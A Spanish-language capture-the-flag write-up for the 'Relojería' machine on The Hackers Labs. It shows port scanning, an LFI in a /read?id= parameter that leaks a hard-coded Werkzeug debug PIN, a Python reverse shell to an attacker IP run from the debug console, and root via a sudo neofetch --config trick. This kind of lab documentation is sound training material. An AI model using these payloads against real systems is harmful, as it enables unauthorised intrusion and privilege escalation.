# ⌚ Relojería

```bash
┌──(Harou㉿kali)-[~/writeups/relojeria]
└─$ cat info.txt

  Plataforma  : The Hackers Labs
  Dificultad  : 🟢 Fácil
  Sistema     : Linux
  Fecha       : 18/03/2026
  Estado      : ✅ Completada
```

---

## 🎯 `cat objetivo.txt`

> Máquina Linux con una aplicación Flask/Werkzeug expuesta en el puerto 8080.
> El objetivo es explotar un LFI para obtener el PIN del modo debug de Werkzeug,
> ejecutar código remoto desde la consola interactiva y escalar privilegios
> abusando de permisos sudo sobre neofetch.

---

## 🔍 `./reconnaissance.sh`

### Escaneo completo de puertos

```bash
sudo nmap -p- --open -sCV -Pn -n --min-rate 5000 192.168.0.23
```

**Hallazgo:** Servicio web corriendo en puerto no estándar **8080** con Virtual Hosting.

### Configuración del host local

```bash
echo "192.168.0.23 watchstore.thl" | sudo tee -a /etc/hosts
```

> 💡 Sin este paso el servidor no responde correctamente — usa Virtual Hosting
> basado en nombre de dominio.

### Fuzzing de directorios

```bash
gobuster dir -u http://watchstore.thl:8080 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x html,php,txt,py
```

**Rutas relevantes encontradas:**
```
/read     → parámetro id vulnerable a LFI
/console  → consola interactiva Werkzeug (protegida por PIN)
```

---

## ⚡ `./exploitation.sh`

### Vulnerabilidad 1 — LFI (Local File Inclusion)

El parámetro `id` en la ruta `/read` no valida la entrada, permitiendo leer archivos del sistema:

```
http://watchstore.thl:8080/read?id=/home/relox/watchstore/app.py
```

**Hallazgo crítico:** El código fuente de `app.py` expone el PIN del modo debug:

```python
os.environ['WERKZEUG_DEBUG_PIN'] = '612-791-734'
```

> 💡 Los errores 500 de Flask suelen revelar rutas absolutas del proyecto —
> usarlas como punto de partida para el LFI.

### Vulnerabilidad 2 — RCE via Werkzeug Debug Console

Con el PIN obtenido, accedemos a `/console` e introducimos el PIN `612-791-734`.

Desde la consola Python ejecutamos una reverse shell:

```python
import socket,os,pty
s=socket.socket()
s.connect(("192.168.0.21",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```

> ⚠️ Antes de ejecutar, abrir un listener en nuestra máquina:
> `nc -lvnp 4444`

### Estabilización de la TTY

Una vez dentro con la reverse shell, estabilizar la terminal:

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
# Enter dos veces
reset xterm
export TERM=xterm
export SHELL=/bin/bash
```

---

## 🏁 `cat flags.txt`

### User flag

```bash
cat /home/relox/user.txt
```

### Root flag

```bash
cat /root/root.txt
```

---

## 🚀 `./privesc.sh`

### Auditoría de permisos sudo

```bash
sudo -l
```

**Hallazgo:** El usuario puede ejecutar `/usr/bin/neofetch` como root sin contraseña (NOPASSWD).

### Escalada de privilegios — Neofetch (GTFOBins)

Neofetch permite cargar un archivo de configuración externo con `--config`.
Aprovechamos esto para ejecutar una shell como root:

```bash
TF=$(mktemp)
echo 'exec /bin/bash' > $TF
sudo /usr/bin/neofetch --config $TF
```

**Resultado:** Shell como root — `uid=0`. ✅

---

## 🧠 `cat lecciones.txt`

- 💡 Cuando veas Flask o Werkzeug, busca siempre `/console` — si el modo debug está activo es RCE directo.
- 💡 LFI sobre el propio código fuente (`app.py`) puede revelar secretos como PINs, tokens o contraseñas.
- 💡 Los errores 500 de Flask exponen rutas absolutas — usar como punto de partida para LFI.
- 💡 Cualquier binario en `sudo -l` debe consultarse en GTFOBins — muchos permiten ejecutar comandos o cargar configs externas.
- 💡 Estabilizar la TTY es esencial para trabajar cómodamente con una reverse shell.

---

## 🛠️ `cat herramientas.txt`

```
nmap · gobuster · curl · netcat · python3 (reverse shell) · neofetch (GTFOBins)
```

---

## 🔗 `cat referencias.txt`

```
GTFOBins Neofetch  : https://gtfobins.github.io/gtfobins/neofetch/
Werkzeug Debug     : https://werkzeug.palletsprojects.com/en/latest/debug/
The Hackers Labs   : https://thehackerslabs.com
```

---

<div align="center">

*`📚 Writeup educativo — The Hackers Labs | Relojería | Fácil`*

</div>
